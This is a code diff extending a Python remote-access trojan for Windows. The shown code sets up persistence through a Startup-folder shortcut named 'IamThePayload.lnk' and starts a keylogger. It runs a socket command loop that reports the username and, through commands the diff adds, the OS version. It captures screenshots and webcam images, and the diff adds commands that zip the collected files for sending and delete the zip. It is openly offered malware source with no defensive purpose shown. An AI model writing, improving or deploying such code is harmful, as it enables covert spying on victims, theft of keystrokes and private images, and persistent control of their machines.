@@ -1,4 +1,4 @@
-from threading import Thread
+import threading 
 import keylogger_modul
 import socket
 import sys
@@ -6,17 +6,19 @@ import urllib.request
 import os
 import getpass
 import pyautogui
-from cv2 import *
-from swinlnk.swinlnk import SWinLnk
-from shutil import copyfile
+import shutil
 import time
+import platform
+from swinlnk.swinlnk import SWinLnk
+from cv2 import *
+
 
 # First Start
 if not os.path.exists('C:\\Users\\'+getpass.getuser()+'\\payload'):
     os.makedirs('C:\\Users\\'+getpass.getuser()+'\\payload')
-    pfad_to_payload_files='C:\\Users\\'+getpass.getuser()+'\\payload_files'
-    os.makedirs(pfad_to_payload_files)
-    copyfile("master.exe","C:\\Users\\"+getpass.getuser()+"\\payload\\master.exe")
+    os.makedirs('C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files')
+    os.makedirs('C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files')
+    shutil.copyfile("master.exe","C:\\Users\\"+getpass.getuser()+"\\payload\\master.exe")
     swl = SWinLnk()
     swl.create_lnk('C:\\Users\\'+getpass.getuser()+'\\payload\\master.exe', 'C:\\Users\\Windows\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IamThePayload.lnk')
 
@@ -24,7 +26,7 @@ if not os.path.exists('C:\\Users\\'+getpass.getuser()+'\\payload'):
 
 # Keylogger
 init_keylogger=keylogger_modul.keylogger_class()
-thread_keylogger=Thread(target=init_keylogger.keylogger_funktion)
+thread_keylogger=threading.Thread(target=init_keylogger.keylogger_funktion)
 thread_keylogger.start()
 
 # Shell
@@ -59,10 +61,16 @@ try:
         elif data.decode().lower() == "show username":          # show username
             s.send(getpass.getuser().encode())
         
+        elif data.decode().lower() == "show os version":        # show version of OS
+            try:
+                s.send(platform.platform().encode())
+            except:
+                s.send(b"this works not yet")
+
         elif data.decode().lower() == "make screenshot":        # make screenshot   # This is under development and is not yet finished!
             try:
                 screen_shot = pyautogui.screenshot()
-                screen_shot.save('C:\\Users\\'+getpass.getuser()+'\\payload_files'+"\\"+"screenshot.png", "PNG")
+                screen_shot.save('C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files\\'+"screenshot.png", "PNG")
                 s.send(b"screenshot was taken")
             except:
                 s.send(b"this works not yet")
@@ -73,11 +81,33 @@ try:
                 for i in range(0, 5):
                     worked, img = webcam.read()
                     if worked:
-                        imwrite('C:\\Users\\'+getpass.getuser()+'\\payload_files'+"\\"+"cam_shot.jpg", img)
+                        imwrite('C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files\\'+"cam_shot.jpg", img)
                         webcam.release()
                         s.send(b"cam shot was taken")
             except:
                 s.send(b"this works not yet")
+
+        elif data.decode().lower() == "make zip":               # make zip
+            try:
+                shutil.make_archive("C:\\Users\\"+getpass.getuser()+"\\payload\\payload_files\\sendme", "zip", 'C:\\Users\\'+getpass.getuser()+'\\payload\\payload_files\\files') 
+                s.send(b"zipped")
+
+            except FileNotFoundError:
+                s.send(b"File not found")
+            except:
+                s.send(b"this works not yet")
+
+
+        elif data.decode().lower()== "remove zip":              # remove zip
+            try:
+                os.remove("C:\\Users\\"+getpass.getuser()+"\\payload\\payload_files\\sendme.zip")
+                s.send(b"removed")
+
+            except FileNotFoundError:
+                s.send(b"File not found")
+            except:
+                s.send(b"this works not yet")
+
         
 
         else:
